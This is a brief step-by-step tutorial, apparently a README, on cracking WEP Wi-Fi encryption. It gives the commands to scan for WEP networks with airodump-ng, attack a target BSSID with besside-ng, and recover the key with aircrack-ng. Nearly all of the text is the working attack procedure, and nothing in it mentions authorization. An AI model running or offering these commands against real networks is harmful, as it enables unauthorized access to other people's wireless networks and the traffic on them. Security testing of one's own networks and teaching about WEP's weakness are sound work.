## IN THIS TOTURIAL YOU WILL LEARN HOW TO CRACK WEP WIFI SECURITY.
## YOU CAN USE PARROT SECURITY OS FOR BEST RESULTS.



STEP 1:  sudo airodump-ng wlan0 --encrypt wep

STEP 2:  once you get the wep targets then press CNTRL+C

STEP 3:  sudo besside-ng wlan0 -b 00:00:00:00:00:00 (we are using besside-ng tool here and -b = bssid of target)

STEP 4:  if you are getting any error while running the above command then run i twice and thrice until you suceed

STEP 5:  after 20000 you will recieve the key in another format but to remember the key in human touch then run this command

STEP 6:  aircrack-ng ./wep.cap

STEP 7:  select the target

STEP 8:  once it will found the key it will show you the key will be ASCII

